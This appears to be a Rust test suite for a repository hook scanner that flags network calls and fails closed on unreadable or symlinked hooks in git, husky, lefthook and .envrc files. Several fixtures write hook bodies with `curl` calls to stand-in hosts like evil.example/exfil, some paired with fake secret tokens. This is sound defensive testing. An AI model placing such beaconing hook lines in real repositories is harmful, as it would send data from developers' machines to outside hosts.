    fn explain_unknown_name_is_empty() {
        let root = tempdir().unwrap();
        write(root.path(), ".husky/pre-commit", "#!/bin/sh\nnpm test\n");
        assert!(explain_for_repo(root.path(), "nonexistent").is_empty());
    }

    /// `explain` must accept BOTH the short hook name (`pre-commit`) AND the path that
    /// `hooks scan` prints (`.git/hooks/pre-commit`), since a user naturally copies the
    /// displayed path. A bogus query still matches nothing.
    #[cfg(unix)]
    #[test]
    fn explain_matches_short_name_or_displayed_path() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        write(
            root.path(),
            ".git/hooks/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );

        // Short name.
        let by_name = explain_for_repo(root.path(), "pre-commit");
        assert_eq!(by_name.len(), 1, "short name should match: {by_name:?}");
        assert_eq!(by_name[0].name, "pre-commit");

        // The displayed path form (what `hooks scan` prints).
        let by_path = explain_for_repo(root.path(), ".git/hooks/pre-commit");
        assert_eq!(by_path.len(), 1, "displayed path should match: {by_path:?}");
        assert_eq!(by_path[0].name, "pre-commit");

        // A bogus query matches nothing.
        assert!(
            explain_for_repo(root.path(), ".git/hooks/bogus").is_empty(),
            "an unknown path must not match"
        );

        // Partial-COMPONENT fragments must NOT match (these only matched via the
        // now-removed bare `ends_with(query)` clause).
        for q in ["commit", "mit", "re-commit"] {
            assert!(
                explain_for_repo(root.path(), q).is_empty(),
                "partial-component fragment {q:?} must not match"
            );
        }
        // But a path-segment-aligned suffix of the displayed path DOES match (the
        // `/<query>` clause): `.git/hooks/pre-commit` ends with `/hooks/pre-commit`.
        assert!(
            !explain_for_repo(root.path(), "hooks/pre-commit").is_empty(),
            "segment-aligned suffix hooks/pre-commit should match via the /<query> clause"
        );
    }

    #[test]
    fn empty_repo_yields_empty_scan() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        let scan = scan_for_repo(root.path());
        assert!(scan.entries.is_empty());
        assert!(scan.all_findings().is_empty());
    }

    #[test]
    fn malformed_package_json_is_fail_closed_not_silence() {
        let root = tempdir().unwrap();
        write(root.path(), "package.json", "{ not valid json");
        let scan = scan_for_repo(root.path());
        let entry = scan
            .entries
            .iter()
            .find(|entry| entry.provider == HookProvider::PackageJson)
            .expect("a malformed package.json must remain visible");
        assert!(entry.findings.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete && finding.severity == Severity::High
        }));
    }

    #[test]
    fn repeated_lifecycle_scans_return_consistent_fresh_results() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\ncurl https://evil.example\n",
        );
        // Both uncached lifecycle scans must surface the same finding.
        let a = scan_triggered_by_leader(root.path(), "git", Some("commit")).unwrap();
        let b = scan_triggered_by_leader(root.path(), "git", Some("commit")).unwrap();
        assert_eq!(a.len(), b.len());
        assert!(a.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall));
    }

    #[test]
    fn unreadable_hook_surfaces_high_not_silence() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        // A non-UTF-8 hook body can't be classified, but a deliberately-unreadable hook is
        // the threat — expect a High uninspectable finding, not zero findings.
        std::fs::write(
            root.path().join(".git/hooks/pre-commit"),
            [0x23, 0x21, 0xff, 0xfe, 0x0a], // "#!" + invalid UTF-8 bytes
        )
        .unwrap();
        let scan = scan_for_repo(root.path());
        let pre = scan
            .entries
            .iter()
            .find(|e| e.name == "pre-commit")
            .expect("an unreadable hook must still be inventoried");
        assert!(
            pre.findings
                .iter()
                .any(|f| f.rule_id == RuleId::AnalysisIncomplete
                    && f.severity == Severity::High
                    && f.detail.contains("uninspectable")),
            "unreadable hook must surface a High fail-closed finding, got {:?}",
            pre.findings
        );
    }

    #[test]
    fn non_ascii_hook_body_does_not_panic() {
        let root = tempdir().unwrap();
        write(
            root.path(),
            ".husky/pre-commit",
            "#!/bin/sh\n# Привет мир\necho hi\n",
        );
        let scan = scan_for_repo(root.path());
        // No network/cred/sudo → no findings; the point is no panic on multibyte.
        assert!(scan.all_findings().is_empty());
    }

    /// A hook symlink whose regular target remains inside the repository is
    /// inspected through descriptor-relative no-follow opens while its body stays
    /// hidden from `explain`.
    #[cfg(unix)]
    #[test]
    fn symlinked_hook_file_is_not_disclosed() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        // A sentinel outside .git/hooks but still inside the repository, holding
        // a secret + a rule-tripping `curl`.
        let sentinel = root.path().join("secret.txt");
        std::fs::write(
            &sentinel,
            "#!/bin/sh\ncurl https://evil.example/exfil # SECRET_TOKEN_abc123\n",
        )
        .unwrap();
        // .git/hooks/pre-commit -> ../../secret.txt (symlinked final component).
        let hook = root.path().join(".git/hooks/pre-commit");
        std::os::unix::fs::symlink(&sentinel, &hook).unwrap();

        let scan = scan_for_repo(root.path());
        let pre = scan
            .entries
            .iter()
            .find(|e| e.name == "pre-commit")
            .expect("a contained symlinked hook must still be inventoried");
        // The sentinel body must NOT have been captured...
        assert!(
            pre.body.is_empty(),
            "symlinked hook body must not be disclosed, got {:?}",
            pre.body
        );
        assert!(
            !pre.body.contains("SECRET_TOKEN_abc123"),
            "the secret must never reach the entry body"
        );
        // The target is safely inspected, so its body-derived network rule fires.
        assert!(
            pre.findings
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "a contained symlink target must be classified without disclosure: {:?}",
            pre.findings
        );
    }

    #[cfg(unix)]
    #[test]
    fn contained_clean_hook_symlink_is_inspected_without_false_positive() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        write(root.path(), "hooks/clean.sh", "#!/bin/sh\necho safe\n");
        std::os::unix::fs::symlink(
            "../../hooks/clean.sh",
            root.path().join(".git/hooks/pre-commit"),
        )
        .unwrap();

        let scan = scan_for_repo(root.path());
        let entry = scan
            .entries
            .iter()
            .find(|entry| entry.name == "pre-commit")
            .expect("contained hook symlink must be inventoried");
        assert!(entry.body.is_empty(), "link targets must not be disclosed");
        assert!(
            entry.findings.is_empty(),
            "a descriptor-proven contained clean target must remain a legitimate control: {:?}",
            entry.findings
        );
    }

    #[cfg(unix)]
    #[test]
    fn escaping_hook_symlink_is_uninspectable_high() {
        let root = tempdir().unwrap();
        let outside = tempdir().unwrap();
        mkgit(root.path());
        let target = outside.path().join("outside-hook");
        std::fs::write(
            &target,
            "#!/bin/sh\ncurl https://evil.example/outside # DO_NOT_DISCLOSE\n",
        )
        .unwrap();
        std::os::unix::fs::symlink(&target, root.path().join(".git/hooks/pre-commit")).unwrap();

        let scan = scan_for_repo(root.path());
        let entry = scan
            .entries
            .iter()
            .find(|entry| entry.name == "pre-commit")
            .expect("escaping hook symlink must remain inventoried");
        assert!(entry.body.is_empty());
        assert!(entry.findings.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.detail.contains("uninspectable")
        }));
        assert!(!entry
            .findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::RepoHookNetworkCall));
    }

    #[cfg(unix)]
    #[test]
    fn dangling_hook_directories_are_present_uninspectable_high() {
        let git_root = tempdir().unwrap();
        mkgit(git_root.path());
        std::fs::remove_dir(git_root.path().join(".git/hooks")).unwrap();
        std::os::unix::fs::symlink("missing-hooks", git_root.path().join(".git/hooks")).unwrap();
        let git_scan = scan_for_repo(git_root.path());
        assert!(git_scan.all_findings().iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.provider == HookProvider::Git
        }));

        let husky_root = tempdir().unwrap();
        std::os::unix::fs::symlink("missing-husky", husky_root.path().join(".husky")).unwrap();
        let husky_scan = scan_for_repo(husky_root.path());
        assert!(husky_scan.all_findings().iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete
                && finding.severity == Severity::High
                && finding.provider == HookProvider::Husky
        }));
    }

    /// PR128: an INTERMEDIATE symlinked hooks directory (`.git` itself a symlink
    /// pointing outside the repo) must be rejected by `canonical_within`, so a hook
    /// whose real location is outside `repo_root` is never read.
    #[cfg(unix)]
    #[test]
    fn intermediate_symlinked_git_dir_is_contained() {
        // The repo we scan.
        let repo = tempdir().unwrap();
        // An attacker-controlled tree OUTSIDE the repo, holding a real hooks dir.
        let outside = tempdir().unwrap();
        std::fs::create_dir_all(outside.path().join("hooks")).unwrap();
        std::fs::write(
            outside.path().join("hooks/pre-commit"),
            "#!/bin/sh\ncurl https://evil.example/exfil # SECRET_TOKEN_xyz789\n",
        )
        .unwrap();

        // repo/.git -> <outside> : the WHOLE .git dir is a symlink out of the repo,
        // so repo/.git/hooks/pre-commit resolves outside `repo_root`.
        std::os::unix::fs::symlink(outside.path(), repo.path().join(".git")).unwrap();

        let scan = scan_for_repo(repo.path());
        // The body must never be read (containment fails), so the curl rule must
        // not fire and the secret must not appear anywhere in the scan.
        assert!(
            !scan
                .all_findings()
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "an out-of-repo hook (via symlinked .git) must not be classified: {:?}",
            rule_ids(&scan)
        );
        assert!(
            scan.entries
                .iter()
                .all(|e| !e.body.contains("SECRET_TOKEN_xyz789")),
            "a hook outside repo_root must never have its body disclosed"
        );
        assert!(scan.all_findings().iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete && finding.severity == Severity::High
        }));
    }

    /// Regression (no-follow read hardening): a PRESENT-but-blocked single-file
    /// surface read by a non-`push_hook_file` collector (here `.envrc` as a symlink,
    /// O_NOFOLLOW-rejected) must STILL be inventoried as a High uninspectable
    /// entry, never silently dropped. Dropping it would let an attacker
    /// hide an auto-run `.envrc` behind a symlink so a `direnv allow` scan comes back
    /// clean.
    #[cfg(unix)]
    #[test]
    fn blocked_single_file_surface_surfaces_high_not_silence() {
        let root = tempdir().unwrap();
        // A sentinel OUTSIDE the repo holding a rule-tripping `curl` + a secret.
        let outside = tempdir().unwrap();
        let sentinel = outside.path().join("secret_envrc");
        std::fs::write(
            &sentinel,
            "export X=1\ncurl https://evil.example/x # SECRET_ENVRC_qwerty\n",
        )
        .unwrap();
        // repo/.envrc -> <outside>/secret_envrc (symlinked final component). The
        // parent (.envrc's dir) is the repo root, so `canonical_within` passes the
        // containment check and `read_text` reaches the O_NOFOLLOW reject.
        std::os::unix::fs::symlink(&sentinel, root.path().join(".envrc")).unwrap();

        let scan = scan_for_repo(root.path());
        let envrc = scan
            .entries
            .iter()
            .find(|e| e.name == ".envrc")
            .expect("a present-but-blocked .envrc must still be inventoried, not dropped");
        // The High fail-closed finding is required...
        assert!(
            envrc
                .findings
                .iter()
                .any(|f| f.rule_id == RuleId::AnalysisIncomplete
                    && f.severity == Severity::High
                    && f.detail.contains("uninspectable")),
            "a blocked .envrc must surface a High fail-closed finding, got {:?}",
            envrc.findings
        );
        // ...the body must not be read through the symlink...
        assert!(
            envrc.body.is_empty() && !envrc.body.contains("SECRET_ENVRC_qwerty"),
            "a symlinked .envrc body must not be disclosed, got {:?}",
            envrc.body
        );
        // ...and no body-derived rule (the curl network-call) may fire.
        assert!(
            !envrc
                .findings
                .iter()
                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
            "a body rule must not fire on a symlink-rejected .envrc: {:?}",
            envrc.findings
        );
    }

    #[cfg(unix)]
    #[test]
    fn blocked_lefthook_config_still_triggers_under_git_leader() {
        let root = tempdir().unwrap();
        let outside = tempdir().unwrap();
        let sentinel = outside.path().join("real_lefthook.yml");
        std::fs::write(
            &sentinel,
            "pre-commit:\n  commands:\n    a:\n      run: echo hi\n",
        )
        .unwrap();
        // repo/lefthook.yml -> outside sentinel: O_NOFOLLOW rejects the symlinked
        // final component, so the config is blocked (Unreadable). Its placeholder
        // must still trigger under a git leader (it carries GIT_EVENTS), not vanish.
        std::os::unix::fs::symlink(&sentinel, root.path().join("lefthook.yml")).unwrap();

        let findings = scan_triggered_by_leader(root.path(), "git", Some("commit"))
            .expect("git commit is hook-triggering");
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == RuleId::AnalysisIncomplete
                    && f.severity == Severity::High
                    && f.detail.contains("uninspectable")),
            "a blocked lefthook.yml must surface a High fail-closed finding under a git leader, got {:?}",
            findings
        );
    }

    #[test]
    fn updating_git_scans_destination_husky_lefthook_and_native_hook_blobs() {
        let root = tempdir().unwrap();
        init_real_git_repo(root.path());
        git_ok(root.path(), &["config", "core.hooksPath", ".githooks"]);
        let base = current_branch(root.path());

        write(
            root.path(),
            ".husky/post-checkout",
            "#!/bin/sh\necho clean\n",
        );
        write(root.path(), ".husky/post-merge", "#!/bin/sh\necho clean\n");
        write(
            root.path(),
            "lefthook.yml",
            "post-checkout:\n  commands:\n    clean:\n      run: echo clean\npost-merge:\n  commands:\n    clean:\n      run: echo clean\n",
        );
        write(
            root.path(),
            ".githooks/post-checkout",
            "#!/bin/sh\necho clean\n",
        );
        git_ok(root.path(), &["add", "--", "."]);
        git_ok(root.path(), &["commit", "-q", "-m", "clean hooks"]);
        git_ok(root.path(), &["branch", "incoming"]);
        git_ok(root.path(), &["checkout", "-q", "incoming"]);

        write(
            root.path(),
            ".husky/post-checkout",
            "#!/bin/sh\ncurl https://evil.invalid/checkout\n",
        );
        write(
            root.path(),
            ".husky/post-merge",
            "#!/bin/sh\ncurl https://evil.invalid/merge\n",
        );
        write(
            root.path(),
            "lefthook.yml",
            "post-checkout:\n  commands:\n    beacon:\n      run: curl https://evil.invalid/lefthook\npost-merge:\n  commands:\n    beacon:\n      run: curl https://evil.invalid/merge-hook\n",
        );
        write(
            root.path(),
            ".githooks/post-checkout",
            "#!/bin/sh\ncurl https://evil.invalid/native\n",
        );
        git_ok(root.path(), &["add", "--", "."]);
        git_ok(root.path(), &["commit", "-q", "-m", "incoming hooks"]);
        git_ok(root.path(), &["checkout", "-q", &base]);

        assert!(
            !std::fs::read_to_string(root.path().join(".husky/post-checkout"))
                .unwrap()
                .contains("evil.invalid"),
            "fixture must prove the current worktree is clean before target inspection"
        );

        for subcommand in ["checkout", "switch"] {
            let args = vec![subcommand.to_string(), "incoming".to_string()];
            let findings = scan_triggered_by_command(Some(root.path()), "git", &args)
                .expect("updating Git command must trigger");
            for provider in [
                HookProvider::Husky,
                HookProvider::Lefthook,
                HookProvider::Git,
            ] {
                assert!(
                    findings.iter().any(|finding| {
                        finding.rule_id == RuleId::RepoHookNetworkCall
                            && finding.provider == provider
                            && finding.location.starts_with("git-")
                    }),
                    "{subcommand} must inspect the incoming {provider:?} body: {findings:?}"
                );
            }
        }

        let merge = scan_triggered_by_command(
            Some(root.path()),
            "git",
            &["merge".to_string(), "incoming".to_string()],
        )
        .expect("git merge must trigger");
        assert!(
            merge.iter().any(|finding| {
                finding.rule_id == RuleId::RepoHookNetworkCall
                    && finding.name == "post-merge"
                    && finding.location.starts_with("git-")
            }),
            "fast-forward merge must inspect the incoming post-merge body: {merge:?}"
        );
    }

    #[test]
    fn checkout_paths_inspects_index_hook_blob_not_only_worktree() {
        let root = tempdir().unwrap();
        init_real_git_repo(root.path());
        write(
            root.path(),
            ".husky/post-checkout",
            "#!/bin/sh\necho clean\n",
        );
        git_ok(root.path(), &["add", "--", ".husky/post-checkout"]);
        git_ok(root.path(), &["commit", "-q", "-m", "clean hook"]);

        write(
            root.path(),
            ".husky/post-checkout",
            "#!/bin/sh\ncurl https://evil.invalid/index\n",
        );
        git_ok(root.path(), &["add", "--", ".husky/post-checkout"]);
        write(
            root.path(),
            ".husky/post-checkout",
            "#!/bin/sh\necho clean\n",
        );

        let findings = scan_triggered_by_command(
            Some(root.path()),
            "git",
            &["checkout".to_string(), "--".to_string(), ".".to_string()],
        )
        .expect("git checkout -- paths must trigger");
        assert!(
            findings.iter().any(|finding| {
                finding.rule_id == RuleId::RepoHookNetworkCall
                    && finding.location.starts_with("git-index:")
            }),
            "the staged destination hook must be inspected even though the old worktree is clean: {findings:?}"
        );
    }

    #[test]
    fn ambiguous_git_updates_fail_closed_and_pull_requires_fetch_then_merge() {
        let root = tempdir().unwrap();
        init_real_git_repo(root.path());
        let base = current_branch(root.path());
        git_ok(root.path(), &["branch", "incoming"]);
        git_ok(root.path(), &["checkout", "-q", "incoming"]);
        write(root.path(), "incoming.txt", "incoming\n");
        git_ok(root.path(), &["add", "--", "incoming.txt"]);
        git_ok(root.path(), &["commit", "-q", "-m", "incoming"]);
        git_ok(root.path(), &["checkout", "-q", &base]);
        write(root.path(), "base.txt", "base\n");
        git_ok(root.path(), &["add", "--", "base.txt"]);
        git_ok(root.path(), &["commit", "-q", "-m", "diverge"]);

        let cases = vec![
            vec!["pull".to_string()],
            vec!["rebase".to_string(), "incoming".to_string()],
            vec!["merge".to_string(), "incoming".to_string()],
            vec!["checkout".to_string(), "missing-ref".to_string()],
            vec![
                "-C".to_string(),
                root.path().display().to_string(),
                "checkout".to_string(),
                "incoming".to_string(),
            ],
            vec!["$GIT_SUBCOMMAND".to_string(), "incoming".to_string()],
            vec!["co".to_string(), "incoming".to_string()],
        ];
        for args in cases {
            assert!(is_hook_triggering_command("git", &args));
            let findings = scan_triggered_by_command(Some(root.path()), "git", &args)
                .expect("visible Git update must trigger");
            assert!(
                findings.iter().any(|finding| {
                    finding.rule_id == RuleId::AnalysisIncomplete
                        && finding.severity == Severity::High
                }),
                "ambiguous update must fail closed: args={args:?}, findings={findings:?}"
            );
        }

        let pull =
            scan_triggered_by_command(Some(root.path()), "git", &["pull".to_string()]).unwrap();
        assert!(
            pull.iter()
                .any(|finding| finding.detail.contains("git fetch")
                    && finding.detail.contains("git merge")),
            "pull refusal must explain the fetch-then-inspected-merge workflow"
        );

        let leader_only = scan_triggered_by_leader(root.path(), "git", Some("checkout"))
            .expect("leader-only updating Git call must still trigger");
        assert!(leader_only.iter().any(|finding| {
            finding.rule_id == RuleId::AnalysisIncomplete && finding.severity == Severity::High
        }));
        assert!(is_hook_triggering_command("git", &["status".to_string()]));
        assert!(is_hook_triggering_command(
            "git",
            &["fetch".to_string(), "origin".to_string()]
        ));
        assert!(!is_hook_triggering_command("git", &["log".to_string()]));
    }

    /// The complement: a genuinely-ABSENT surface still produces NO entry — the fix
    /// only splits the old `None` into Absent (skip) vs Unreadable (inventory), it
    /// must not start inventorying files that simply aren't there.
    #[test]
    fn absent_surface_produces_no_entry() {
        let root = tempdir().unwrap();
        mkgit(root.path());
        // Only an empty `.git/hooks` exists — no .envrc, no package.json, no hooks.
        let scan = scan_for_repo(root.path());
        assert!(
            scan.entries.is_empty(),
            "absent surfaces must yield no entries, got {:?}",
            scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()
        );
        // Specifically, the missing `.envrc` must not have produced a placeholder.
        assert!(
            !scan.entries.iter().any(|e| e.name == ".envrc"),
            "a missing .envrc must not be inventoried"
        );
    }
}
